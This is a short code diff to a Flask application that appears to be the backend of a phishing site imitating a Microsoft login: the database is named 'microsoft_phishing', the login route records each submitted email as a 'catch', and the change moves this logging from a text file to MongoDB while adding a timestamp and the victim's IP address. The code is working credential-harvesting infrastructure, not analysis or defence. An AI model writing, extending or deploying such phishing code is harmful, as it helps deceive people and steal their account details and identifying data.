@@ -1,7 +1,15 @@
 from flask import Flask, render_template, request, jsonify, send_from_directory
 import os
+from pymongo import MongoClient
+from datetime import datetime
 
 app = Flask(__name__)
+
+# MongoDB bağlantısı
+MONGO_URI = "mongodb+srv://your_username:your_password@cluster0.mongodb.net/myFirstDatabase?retryWrites=true&w=majority"
+client = MongoClient(MONGO_URI)
+db = client['microsoft_phishing']
+collection = db['emails']
 
 @app.route('/', methods=['GET'])
 def home():
@@ -17,10 +25,12 @@ def login():
     data = request.get_json()
     email = data.get('email', '')
     
-    # Log the email
-    with open('catches.txt', 'a', encoding='utf-8') as f:
-        f.write(f"Email: {email}\n")
-        f.write("-" * 50 + "\n")
+    # MongoDB'ye kaydet
+    collection.insert_one({
+        'email': email,
+        'timestamp': datetime.utcnow(),
+        'ip': request.remote_addr
+    })
     
     return jsonify({"message": "I catch u!"})
 
